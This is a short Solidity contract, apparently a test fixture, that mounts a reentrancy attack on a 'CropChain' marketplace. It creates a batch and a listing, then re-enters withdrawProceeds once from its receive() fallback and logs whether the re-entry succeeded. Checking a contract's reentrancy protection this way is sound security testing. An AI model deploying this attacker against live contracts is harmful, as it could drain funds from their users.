// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ICropChain {
    function createBatch(
        bytes32 batchId,
        bytes32 cropTypeHash,
        string calldata ipfsCID,
        uint256 quantity,
        string calldata actorName,
        string calldata location,
        string calldata notes
    ) external;

    function createListing(bytes32 batchId, uint256 quantity, uint256 unitPriceWei) external returns (uint256);
    function withdrawProceeds() external;
}

contract ReentrancyAttacker {
    ICropChain public immutable target;

    bool public attackInProgress;
    bool public reentrancySucceeded;
    uint256 public reentryAttempts;

    constructor(address targetAddress) {
        target = ICropChain(targetAddress);
    }

    function createBatchAndListing(
        bytes32 batchId,
        bytes32 cropTypeHash,
        uint256 batchQuantity,
        uint256 listingQuantity,
        uint256 unitPriceWei
    ) external {
        target.createBatch(
            batchId,
            cropTypeHash,
            "ipfs://attack-batch",
            batchQuantity,
            "attacker",
            "mandi",
            "seed"
        );

        target.createListing(batchId, listingQuantity, unitPriceWei);
    }

    function attackWithdraw() external {
        attackInProgress = true;
        target.withdrawProceeds();
        attackInProgress = false;
    }

    receive() external payable {
        if (attackInProgress && reentryAttempts == 0) {
            reentryAttempts = 1;
            (bool success, ) = address(target).call(
                abi.encodeWithSignature("withdrawProceeds()")
            );
            reentrancySucceeded = success;
        }
    }
}
